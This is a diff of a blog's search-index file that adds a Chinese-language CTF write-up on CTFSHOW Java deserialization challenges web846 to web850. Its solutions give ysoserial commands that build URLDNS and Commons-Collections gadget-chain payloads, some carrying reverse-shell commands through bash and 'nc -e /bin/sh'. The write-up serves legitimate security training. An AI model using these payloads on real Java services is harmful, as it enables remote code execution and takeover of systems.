@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>CTFSHOW Java 反序列化</title>
+      <link href="/2023/01/26/ctfshow-java-fan-xu-lie-hua/"/>
+      <url>/2023/01/26/ctfshow-java-fan-xu-lie-hua/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CTFSHOW-Java-反序列化"><a href="#CTFSHOW-Java-反序列化" class="headerlink" title="[CTFSHOW] Java 反序列化"></a>[CTFSHOW] Java 反序列化</h1><p>工具列表</p><ul><li><a href="https://github.com/frohoff/ysoserial">ysoserial</a></li></ul><h2 id="1-web846"><a href="#1-web846" class="headerlink" title="1. web846"></a>1. web846</h2><ul><li>题目描述</li></ul><blockquote><p>ctfshow会对你post提交的<strong>ctfshow</strong>参数进行base64解码<br>然后进行反序列化<br>构造出对当前题目地址的<strong>dns查询即可</strong>获得flag</p></blockquote><ul><li>题目解析</li></ul><p>简单的 URLDNS，直接使用工具生成</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS <span class="token string">'http://f230b38e-28a9-48fa-9a88-1a02abcd06f8.challenge.ctf.show/'</span> <span class="token operator">|</span> base64 <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-web847"><a href="#2-web847" class="headerlink" title="2. web847"></a>2. web847</h2><ul><li>题目提示</li></ul><blockquote><p>题目环境中，没有nc和curl命令</p></blockquote><ul><li>题目描述</li></ul><blockquote><p>提交<strong>ctfshow</strong>参数进行base64解码<br>然后进行反序列化<br>我是java7，使用了<strong>commons-collections 3.1</strong>的库<br>为了保证业务安全，我删除了nc和curl命令<br>下面是我接收参数的代码<br><code>data=new BASE64Decoder().decodeBuffer(request.getParameter("ctfshow"));</code></p></blockquote><ul><li>题目解析</li></ul><p>使用 commons-collections 3.1 的库，可以使用 C1、CC3、CC5、CC6、CC7 进行攻击</p><p>执行反弹 shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">"bash -c {echo,执行命令的Base64编码}|{base64,-d}|{bash,-i}"</span> <span class="token operator">|</span> base64 <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-web848"><a href="#3-web848" class="headerlink" title="3. web848"></a>3. web848</h2><ul><li>题目描述</li></ul><blockquote><p>提交<strong>ctfshow</strong>参数进行base64解码<br>然后进行反序列化<br>我是java7，使用了<strong>commons-collections 3.1</strong>的库<br>为了保证业务安全，我删除了nc和curl命令<br>甚至不准用TransformedMap类反序列化</p><p>下面是我接收参数的代码<br><code>data=new BASE64Decoder().decodeBuffer(request.getParameter("ctfshow"));</code></p></blockquote><ul><li>题目解析</li></ul><p>提示不能使用 TransformedMap 类，使用 CC1 外其他的链子即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">"bash -c {echo,执行命令的Base64编码}|{base64,-d}|{bash,-i}"</span> <span class="token operator">|</span> base64 <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-web849"><a href="#4-web849" class="headerlink" title="4. web849"></a>4. web849</h2><ul><li>题目提示</li></ul><blockquote><p>CC链之二，<strong>可以用nc反弹</strong></p></blockquote><ul><li>题目描述</li></ul><blockquote><p>提交<strong>ctfshow</strong>参数进行base64解码<br>然后进行反序列化<br>我是java8，使用了<strong>commons-collections 4.0</strong>的库<br>为了保证业务安全，我删除了nc和curl命令</p><p>下面是我接收参数的代码<br><code>data=new BASE64Decoder().decodeBuffer(request.getParameter("ctfshow"));</code></p></blockquote><ul><li>题目解析</li></ul><p>使用了 commons-collections 4.0 的库，可以使用 CC2 与 CC4 链进行攻击</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 <span class="token string">"nc IP PORT -e /bin/sh"</span> <span class="token operator">|</span> base64 <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-web850"><a href="#5-web850" class="headerlink" title="5. web850"></a>5. web850</h2><ul><li>题目描述</li></ul><blockquote><p>提交<strong>ctfshow</strong>参数进行base64解码<br>然后进行反序列化<br>我是java7，使用了<strong>commons-collections 3.1</strong>的库并对一些可能有危险的类进行了封禁，<br>为了保证业务安全，我删除了nc和curl命令</p><p>下面是我接收参数的代码<br><code>data=new BASE64Decoder().decodeBuffer(request.getParameter("ctfshow"));</code></p></blockquote><ul><li>题目解析</li></ul><p>封禁了一些可用的类，测试一下 CC3 还可以使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections3 <span class="token string">"bash -c {echo,执行命令的Base64编码}|{base64,-d}|{bash,-i}"</span> <span class="token operator">|</span> base64 <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF 刷题 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF 刷题 </tag>
+            
+            <tag> CTFSHOW </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Java 反序列化 Commons-Collections 篇 CC6 链</title>
       <link href="/2023/01/25/java-fan-xu-lie-hua-commons-collections-pian-cc6-lian/"/>
       <url>/2023/01/25/java-fan-xu-lie-hua-commons-collections-pian-cc6-lian/</url>
@@ -33,7 +60,7 @@
     
     
     <entry>
-      <title>CTFSHOW-税务比武</title>
+      <title>CTFSHOW 税务比武</title>
       <link href="/2023/01/22/ctfshow-shui-wu-bi-wu/"/>
       <url>/2023/01/22/ctfshow-shui-wu-bi-wu/</url>
       
